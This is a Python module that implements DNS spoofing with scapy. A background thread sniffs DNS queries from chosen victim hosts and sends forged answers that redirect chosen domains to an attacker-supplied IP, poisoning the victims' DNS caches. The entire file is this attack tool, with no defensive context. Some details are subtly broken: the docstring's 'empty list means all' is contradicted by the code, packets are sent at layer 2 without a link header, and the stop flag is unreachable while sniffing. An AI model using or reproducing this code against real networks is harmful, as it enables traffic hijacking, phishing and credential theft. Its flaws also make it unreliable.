from scapy import packet
from scapy.layers.dns import DNSRR, DNSQR, DNS
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import sendp, sniff
import threading


class DNSSpoofing(threading.Thread):

    def __init__(self, interface: list, domain_names: list, hosts: list, redirect_IP: str):
        """
        Starts DNS spoofing in a background thread

            :param interface: interface on which DNS requests will be sniffed
            :param domain_names: list of the domain names to be spoofed, empty list means all domains will be spoofed
            :param hosts: list of the hosts to be spoofed, empty list means all hosts will be spoofed
            :param redirect_IP: IP address that will be used to poison the DNS cache of spoofed hosts
        """
        super(DNSSpoofing, self).__init__()
        self.interface = interface
        self.domain_names = domain_names
        self.hosts = hosts
        self.redirect_IP = redirect_IP
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    def is_stopped(self):
        return self._stop.isSet()

    def run(self):

        def DNS_spoof(packet: packet) -> None:

            def create_spoofed_dns_answer(redirect_IP: str, sniffed_packet: packet) -> packet:
                """
                Creates a spoofed DNS answer packet

                    :param redirect_IP: IP that will be used to poison the cache of victim
                    :param sniffed_packet: DNS request packet requesting IP of spoofed domain sent by victim
                    :return: Spoofed DNS packet that can be used to poison DNS cache
                """

                # extract layers from sniffed packet
                req_IP = sniffed_packet[IP]
                req_UDP = sniffed_packet[UDP]
                req_DNS = sniffed_packet[DNS]
                req_DNSQR = sniffed_packet[DNSQR]

                # create spoofed response packet
                resp_IP = IP(src=req_IP.dst, dst=req_IP.src)
                resp_UDP = UDP(sport=req_UDP.dport, dport=req_UDP.sport)
                resp_DNSRR = DNSRR(rrname=req_DNSQR.qname, rdata=redirect_IP)
                resp_DNS = DNS(qr=1, id=req_DNS.id, qd=req_DNSQR, an=resp_DNSRR)
                spoofed_resp = resp_IP / resp_UDP / resp_DNS

                return spoofed_resp

            # Packet is a DNS request?
            if not (DNS in packet and packet[DNS].qr == 0):
                return
            # Packet destination a domain name that should be spoofed?
            if not (packet[DNSQR].qname.decode("utf8") in self.domain_names):
                return
            # Packet sent by a target host?
            if not (packet[IP].src in self.hosts):
                return

            spoofed_ans = create_spoofed_dns_answer(self.redirect_IP, packet)
            sendp(spoofed_ans, iface=self.interface)
            print("Spoofed DNS request sent by host "
                  + packet[IP].src + "for"
                  + packet[DNSQR].qname.decode("utf8")
                  )

        print("Now DNS spoofing...")
        while True:
            if self.is_stopped():
                print("Stopped DNS spoofing")
                return
            sniff(iface=self.interface, prn=DNS_spoof, filter="udp port 53", )
